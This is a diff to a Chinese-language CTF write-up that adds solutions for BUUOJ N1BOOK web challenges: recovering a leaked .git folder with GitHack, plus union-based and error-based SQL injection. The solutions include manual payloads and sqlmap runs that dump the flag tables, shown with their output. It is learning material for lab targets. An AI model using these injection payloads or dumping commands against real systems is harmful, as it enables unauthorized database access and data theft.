@@ -1336,7 +1336,7 @@ else {
 
 ------
 
-### [[第一章 web入门]常见的搜集](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86)
+### [N1BOOK[第一章 web入门]常见的搜集](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86)
 
 `dirsearch`扫描靶机，发现有3个文件：`robots.txt`，`index.php~`，`./index.php.swp`
 
@@ -1353,6 +1353,52 @@ Disallow:
 下载`./index.php.swp`后在`Kali Linux`系统的`Terminal`输入`vim -r index.php.swp`即可看到源代码中有`flag3:p0rtant_hack}`。
 
 提交`n1book{info_1s_v3ry_imp0rtant_hack}`即可。
+
+------
+
+### [N1BOOK[第一章 web入门]粗心的小李](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E)
+
+进入靶机后看到页面
+
+> Git测试
+>
+> Hello, CTFer!
+> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。
+>
+> 小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(
+> very easy
+
+如果直接访问靶机的`/.git/`目录，会出现403 Forbidden。
+
+需要用`GitHack`工具求解，打开`index.html`或者`tail -n16`即可看到`flag`。
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tools]
+└─$ git clone https://github.com/lijiejie/GitHack.git          
+Cloning into 'GitHack'...
+remote: Enumerating objects: 56, done.
+remote: Counting objects: 100% (22/22), done.
+remote: Compressing objects: 100% (16/16), done.
+remote: Total 56 (delta 6), reused 18 (delta 6), pack-reused 34 (from 1)
+Receiving objects: 100% (56/56), 17.10 KiB | 547.00 KiB/s, done.
+Resolving deltas: 100% (14/14), done.
+
+┌──(t0ur1st㉿kali)-[~/tools]
+└─$ cd GitHack
+
+┌──(t0ur1st㉿kali)-[~/tools/GitHack]
+└─$ python GitHack.py http://85efb691-f6fd-4592-be06-a4ac967b2398.node5.buuoj.cn/.git/
+[+] Download and parse index file ...
+[+] index.html
+[OK] index.html
+
+┌──(t0ur1st㉿kali)-[~/tools/GitHack]
+└─$ tail -n16 85efb691-f6fd-4592-be06-a4ac967b2398.node5.buuoj.cn/index.html    
+                <p>n1book{git_looks_s0_easyfun}</p>
+    ......
+```
+
+提交`n1book{git_looks_s0_easyfun}`即可。
 
 ------
 
@@ -1511,6 +1557,232 @@ if(file_get_contents($_GET['data']) == "Welcome to CTF"){
 1' and 1=1#    // NO,Wrong username password！！！
 1' or '1'='1   // Login Success!
 ```
+
+------
+
+### N1BOOK[第一章 web入门]SQL注入-1
+
+进入靶机后发现服务器会根据不同的`id`给出不同的文章。结合题目推测`/index.php?id=1`存在注入点。
+
+直接用`sqlmap`爆破即可。
+
+```bash
+$ sqlmap -u "http://ad2b7f27-e1d6-4d73-8b28-9280d4f21deb.node5.buuoj.cn:81/index.php?id=1" --dbs
+[INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: OpenResty, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[INFO] fetching database names
+[INFO] retrieved: 'information_schema'
+[INFO] retrieved: 'mysql'
+[INFO] retrieved: 'note'
+[INFO] retrieved: 'performance_schema'
+available databases [4]:                                          
+[*] information_schema
+[*] mysql
+[*] note
+[*] performance_schema
+
+$ sqlmap -u "http://ad2b7f27-e1d6-4d73-8b28-9280d4f21deb.node5.buuoj.cn:81/index.php?id=1" -D note --tables
+[INFO] fetching tables for database: 'note'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'fl4g'
+[INFO] retrieved: 'notes'
+Database: note                                                    
+[2 tables]
++-------+
+| fl4g  |
+| notes |
++-------+
+
+$ sqlmap -u "http://ad2b7f27-e1d6-4d73-8b28-9280d4f21deb.node5.buuoj.cn:81/index.php?id=1" -D note -T fl4g --columns
+[INFO] fetching columns for table 'fl4g' in database 'note'                       [WARNING] reflective value(s) found and filtering out
+Database: note
+Table: fl4g
+[1 column]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| fllllag | varchar(40) |
++---------+-------------+
+
+$ sqlmap -u "http://ad2b7f27-e1d6-4d73-8b28-9280d4f21deb.node5.buuoj.cn:81/index.php?id=1" -D note -T fl4g -C fllllag --dump
+[INFO] fetching entries of column(s) 'fllllag' for table 'fl4g' in database 'note'
+[WARNING] reflective value(s) found and filtering out
+Database: note
+Table: fl4g
+[1 entry]
++---------------------------------+
+| fllllag                         |
++---------------------------------+
+| n1book{union_select_is_so_cool} |
++---------------------------------+
+```
+
+提交`n1book{union_select_is_so_cool}`即可。
+
+如果手动`SQL`注入的话，步骤如下：
+
+`?id=1%27--+`，显示第一篇文章。`?id=2-1`显示第二篇文章。字符型SQL注入。
+
+`?id=1' order by 3 --+`回显正常，而改成`id=1' order by 4 --+`后无回显，说明回显字段是3。
+
+`?id=-1' union select 1,database(),3 --+`查询到当前数据库名称为`note`。回显位是2和3。
+
+> note
+> 3
+
+查询当前数据库`note`中的所有数据表信息：
+
+```
+?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+```
+
+> 2
+> fl4g,notes
+
+查询数据库`note`中指定数据表`fl4g`中的所有数据列信息：
+
+```
+?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='fl4g'--+
+```
+
+> 2
+> fllllag
+
+查询数据库`note`中数据表`fl4g`的指定数据列`fllllag`的字段信息：
+
+```
+?id=-1' union select 1,2,fllllag from note.fl4g--+
+```
+
+> 2
+> n1book{union_select_is_so_cool}
+
+提交`n1book{union_select_is_so_cool}`即可。
+
+------
+
+### N1BOOK[第一章 web入门]SQL注入-2
+
+访问路径`/login.php`。可以看到关键注释：
+
+```html
+<!-- 如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦-->
+```
+
+由此可知，只要触发SQL语句的错误就可以看到报错信息，这道题属于SQL报错注入。
+
+用`HackBar`或者`Burp Suite`访问`/login.php?tips=1`，构造`POST`请求。
+
+SQL报错注入，`database()`查询当前数据库信息：
+
+```
+name=1'and updatexml(1,concat(0x7e,(database()),0x7e),1)#&pass=1
+```
+
+> string(28) "XPATH syntax error: '~note~'" {"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
+
+如果用`select`的话会报错，而改成大写后可以绕过。查询数据库`note`中的所有数据表信息：
+
+```
+name=1'and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&pass=1
+```
+
+> string(34) "XPATH syntax error: '~fl4g,users~'" {"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
+
+查询数据库`note`中指定数据表`fl4g`的所有数据列信息：
+
+```
+name=1'and updatexml(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_name='fl4g'),0x7e),1)#&pass=1
+```
+
+> string(28) "XPATH syntax error: '~flag~'" {"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
+
+查询数据库`note`中数据表`fl4g`的指定数据列`flag`中的字段信息：
+
+```
+name=1'and updatexml(1,concat(0x7e,(SELECT flag from note.fl4g),0x7e),1)#&pass=1
+```
+
+> string(50) "XPATH syntax error: '~n1book{login_sqli_is_nice}~'" {"error":1,"msg":"\u8d26\u53f7\u4e0d\u5b58\u5728"}
+
+提交`n1book{login_sqli_is_nice}`即可。
+
+当然，考场上还是用`sqlmap`直接爆破会更快。
+
+在`sqlmap`中，默认使用的注入技术是`--technique=BEUSTQ`。其中每一个字母代表一种注入类型。
+
+| 字母  |      技术       |                说明                |
+| :---: | :-------------: | :--------------------------------: |
+| **B** |  Boolean-based  |  布尔盲注（根据页面真假变化判断）  |
+| **E** |   Error-based   | 报错注入（利用数据库错误回显数据） |
+| **U** |   Union-based   |            联合查询注入            |
+| **S** | Stacked queries |       堆叠查询（多语句执行）       |
+| **T** |   Time-based    |      时间盲注（基于响应延迟）      |
+| **Q** | Inline queries  |         内联查询（较少用）         |
+
+我们可以指定`--technique=E`，也可以省略该参数，让`sqlmap`使用默认的`--technique=BEUSTQ`。
+
+```bash
+$ sqlmap -u "http://dc6952d1-f2ec-4a14-a8f5-46275bb43ef3.node5.buuoj.cn:81/login.php/?tips=1" --data "name=admin&pass=1" --technique=E --batch --dbs
+[INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: OpenResty, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[INFO] fetching database names
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'information_schema'
+[INFO] retrieved: 'mysql'
+[INFO] retrieved: 'note'
+[INFO] retrieved: 'performance_schema'
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] note
+[*] performance_schema
+
+$ sqlmap -u "http://dc6952d1-f2ec-4a14-a8f5-46275bb43ef3.node5.buuoj.cn:81/login.php/?tips=1" --data "name=admin&pass=1" --batch -D note --tables
+[INFO] fetching tables for database: 'note'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'fl4g'
+[INFO] retrieved: 'users'
+Database: note
+[2 tables]
++-------+
+| fl4g  |
+| users |
++-------+
+
+$ sqlmap -u "http://dc6952d1-f2ec-4a14-a8f5-46275bb43ef3.node5.buuoj.cn:81/login.php/?tips=1" --data "name=admin&pass=1" --batch -D note -T fl4g --columns
+[INFO] fetching columns for table 'fl4g' in database 'note'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'flag'
+[INFO] retrieved: 'varchar(40)'
+Database: note
+Table: fl4g
+[1 column]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| flag   | varchar(40) |
++--------+-------------+
+
+$ sqlmap -u "http://dc6952d1-f2ec-4a14-a8f5-46275bb43ef3.node5.buuoj.cn:81/login.php/?tips=1" --data "name=admin&pass=1" --batch -D note -T fl4g -C flag --dump
+[INFO] fetching entries of column(s) 'flag' for table 'fl4g' in database 'note'   
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'n1book{login_sqli_is_nice}'
+Database: note
+Table: fl4g
+[1 entry]
++----------------------------+
+| flag                       |
++----------------------------+
+| n1book{login_sqli_is_nice} |
++----------------------------+
+```
+
+提交`n1book{login_sqli_is_nice}`即可。
 
 ------
 
